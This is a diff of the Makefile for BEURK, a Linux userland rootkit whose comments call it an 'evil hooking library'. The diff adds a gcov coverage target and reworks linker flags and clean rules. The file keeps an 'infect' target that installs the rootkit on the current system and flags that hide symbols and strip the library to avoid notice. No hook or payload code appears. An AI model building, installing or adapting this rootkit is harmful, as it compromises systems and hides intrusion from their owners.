@@ -9,11 +9,7 @@ BEURK_INSTALL_DIR	?= $(shell sed -ne 's/^INSTALL_DIR\s*=\s*//p' < $(BEURK_CONFIG
 
 # compiler options
 CFLAGS		:= -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE
-LDFLAGS		:= -lc -ldl -lutil -lpam
-
-ifeq ($(BEURK_DEBUG_LEVEL), 0)
-	CFLAGS	+= -fvisibility=hidden
-endif
+LDLIBS		:= -lc -ldl -lutil -lpam -lgcov
 
 # take sources from /src and /src/hooks
 SOURCES		= src/init.c \
@@ -46,6 +42,7 @@ SOURCES		= src/init.c \
 			  src/hooks/__xstat64.c \
 			  src/hooks/accept.c
 OBJECTS		= $(patsubst src/%.c, obj/%.o, $(SOURCES))
+COVERAGE	= $(patsubst src/%.c, obj/%.gcda, $(SOURCES))
 
 # make standard rule phony
 .PHONY: all re clean distclean test coverage infect disinfect
@@ -54,7 +51,11 @@ OBJECTS		= $(patsubst src/%.c, obj/%.o, $(SOURCES))
 obj/%.o: $(addprefix src/, %.c)
 	@mkdir -p `dirname $@`
 	@echo $@
-	$(CC) $(CFLAGS) -fPIC -g -c $< -o $@
+	@if [ $(BEURK_DEBUG_LEVEL) -eq 0 ]; then \
+		$(CC) $(CFLAGS) -fPIC -fvisibility=hidden -c $< -o $@; \
+	else \
+		$(CC) $(CFLAGS) -fPIC -g -O0 -c $< -o $@; \
+	fi
 
 # build evil hooking library (not relink)
 all: $(BEURK_LIBRARY_NAME)
@@ -65,7 +66,7 @@ src/config.c:
 
 $(BEURK_LIBRARY_NAME): src/config.c $(OBJECTS)
 	$(CC) -fPIC -shared -Wl,-soname,$(BEURK_LIBRARY_NAME) $(OBJECTS) \
-		$(LDFLAGS) -o $(BEURK_LIBRARY_NAME)
+		$(LDLIBS) -o $(BEURK_LIBRARY_NAME)
 ifeq ($(BEURK_DEBUG_LEVEL), 0)
 	strip --strip-unneeded -R .note -R .comment $(BEURK_LIBRARY_NAME)
 endif
@@ -75,8 +76,12 @@ test:
 	./utils/run-tests.sh tests
 
 # compile DSO with flags for code coverage
-coverage:
-	@echo TODO ! && false
+coverage: CFLAGS += -fprofile-arcs -ftest-coverage
+coverage: BEURK_DEBUG_LEVEL=2
+coverage: re
+	echo $(BEURK_DEBUG_LEVEL)
+	./utils/run-tests.sh tests/core/unit-tests
+	gcov $(COVERAGE)
 
 # infect current system with the rootkit
 infect: $(BEURK_LIBRARY_NAME)
@@ -89,14 +94,14 @@ infect: $(BEURK_LIBRARY_NAME)
 disinfect:
 	@echo TODO ! && false
 
-# re build evil hooking library
-re: distclean all
-
 # remove object files
 clean:
-	-rm -rf obj/
+	-$(RM) -r obj/
 
 # remove object files and evil hooking library
 distclean: clean
-	-rm -f $(BEURK_LIBRARY_NAME)
-	-rm -f src/config.c includes/config.h
+	-$(RM) $(BEURK_LIBRARY_NAME)
+	-$(RM) src/config.c includes/config.h
+
+# re build evil hooking library
+re: distclean all
